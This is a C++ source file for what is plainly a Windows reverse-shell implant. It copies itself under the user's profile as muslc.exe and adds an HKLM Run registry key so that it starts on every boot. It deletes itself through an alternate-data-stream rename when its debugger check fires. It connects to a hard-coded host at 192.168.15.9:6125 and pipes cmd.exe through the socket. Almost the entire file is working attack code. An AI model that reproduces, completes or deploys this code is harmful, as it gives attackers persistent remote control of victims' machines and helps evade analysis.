#include <winsock2.h>  
#include <ws2tcpip.h>  
#include <filesystem>
#include <Windows.h>
#include <winternl.h>
#include <cstdio>
#include "ReaderHeader.h"
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

#define NEW_STREAM L":Mommy"

int SelfKurtCobain(void)
{
	PFILE_RENAME_INFO PFRI = NULL;
	size_t nameLength = wcslen(NEW_STREAM) * sizeof(WCHAR);
	size_t sizePrfi = sizeof(FILE_RENAME_INFO) + nameLength;
	FILE_DISPOSITION_INFO FDI = { 0 };
	WCHAR path[MAX_PATH * 2] = { 0 };

	PFRI = (PFILE_RENAME_INFO)calloc(1, sizePrfi);

	if (PFRI == NULL)
	{
		return EXIT_FAILURE;
	}

	FDI.DeleteFile = TRUE;

	PFRI->FileNameLength = nameLength;
	memcpy(PFRI->FileName, NEW_STREAM, nameLength);

	if (GetModuleFileNameW(NULL, path, (MAX_PATH * 2)) == 0)
	{
		free(PFRI);
		return EXIT_FAILURE;
	}

	HANDLE hFile = CreateFileW(path, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		free(PFRI);
		return EXIT_FAILURE;
	}


	if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, (DWORD)sizePrfi))
	{
		free(PFRI);
		CloseHandle(hFile);
		return EXIT_FAILURE;
	}

	CloseHandle(hFile);

	HANDLE hFile2 = CreateFileW(path, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile2 == INVALID_HANDLE_VALUE)
	{
		free(PFRI);
		return EXIT_FAILURE;
	}

	if (!SetFileInformationByHandle(hFile2, FileDispositionInfo, &FDI, sizeof(FDI)))
	{
		free(PFRI);
		CloseHandle(hFile2);
		return EXIT_FAILURE;
	}

	CloseHandle(hFile2);
	free(PFRI);

	return EXIT_SUCCESS;
}

void PrintLastErrorMessage()
{
	DWORD errorCode = GetLastError();
	LPWSTR errorMsg = nullptr;

	FormatMessageW(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errorCode,
		0, 
		(LPWSTR)&errorMsg,
		0,
		NULL
	);

	if (errorMsg)
	{
		std::wcout << L"Error code: " << errorCode << L"\nMessage: " << errorMsg << std::endl;
		LocalFree(errorMsg); 
	}
	else
	{
		std::wcout << L"Unknown error code: " << errorCode << std::endl;
	}
}

int Persistence(const wchar_t *path)
{
	HKEY hKey = NULL;
	const wchar_t* nameKey = L"Mommy";
	int lstatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

	if (lstatus != ERROR_SUCCESS)
	{
		PrintLastErrorMessage();
		return EXIT_FAILURE;
	}

	int lstatus2 = RegSetValueExW(hKey, nameKey, 0, REG_SZ, (const BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));

	if (lstatus2 != ERROR_SUCCESS)
	{
		PrintLastErrorMessage();
		RegCloseKey(hKey);
		return EXIT_FAILURE;
	}

	RegCloseKey(hKey);
}

int DoubleItSelf(void)
{
	wchar_t* userProfile = nullptr;
	size_t size = 0;
	std::filesystem::path targetPath;

	if (_wdupenv_s(&userProfile, &size, L"USERPROFILE") == 0 && userProfile != nullptr)
	{
		targetPath = std::filesystem::path(userProfile) / L"Links" / L"muslc.exe";
		free(userProfile);
	}

	WCHAR newPath[MAX_PATH * 2] = { 0 };

	if (GetModuleFileNameW(NULL, newPath, (MAX_PATH * 2)) == 0)
	{
		return EXIT_FAILURE;
	}

	if (CopyFileW(newPath, targetPath.c_str(), TRUE) == 0)
	{
		return EXIT_FAILURE;
	}

	Persistence(targetPath.c_str());

	return EXIT_SUCCESS;
}

int CopyExists(void)
{
	wchar_t* userProfile = nullptr;
	size_t size = 0;
	std::filesystem::path targetPath;

	if (_wdupenv_s(&userProfile, &size, L"USERPROFILE") == 0 && userProfile != nullptr)
	{
		targetPath = std::filesystem::path(userProfile) / L"Links" / L"muslc.exe";
		free(userProfile);
	}

	if (std::filesystem::exists(targetPath))
	{
		return EXIT_SUCCESS;
	}
	else
	{
		return EXIT_FAILURE;
	}
}

int ConnectToRaccon()
{
	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return EXIT_FAILURE;
	}

	std::string ip = "192.168.15.9";
	SOCKET sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0 , 0);
	sockaddr_in sockAddr;
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port = htons(6125);

	if (inet_pton(AF_INET, ip.c_str(), &(sockAddr.sin_addr)) != 1) {
		PrintLastErrorMessage();
		return EXIT_FAILURE;
	}

	if (WSAConnect(sock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
	{
		PrintLastErrorMessage();
		return EXIT_FAILURE;
	}

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = (HANDLE)sock;	
	si.hStdOutput = (HANDLE)sock;
	si.hStdError = (HANDLE)sock;

    if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
       return EXIT_FAILURE;
    }

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
		
	return EXIT_SUCCESS;
}

int main(void)
{
	if (!IsDebugged())
	{
		SelfKurtCobain();
		std::cout << "Debugged!" << std::endl;
	}
	else
	{
		if (CopyExists() == EXIT_FAILURE)
		{
			DoubleItSelf();

			WCHAR path[MAX_PATH * 2] = { 0 };

			if (GetModuleFileNameW(NULL, path, (MAX_PATH * 2)) == 0)
			{
				return EXIT_FAILURE;
			}

			WCHAR* exeName = wcsrchr(path, L'\\');

			if (exeName != L"muslc.exe")
			{
				ConnectToRaccon();
			}

			return EXIT_SUCCESS;
		}
		else {
			ConnectToRaccon();
			return EXIT_SUCCESS;
		}
	}
}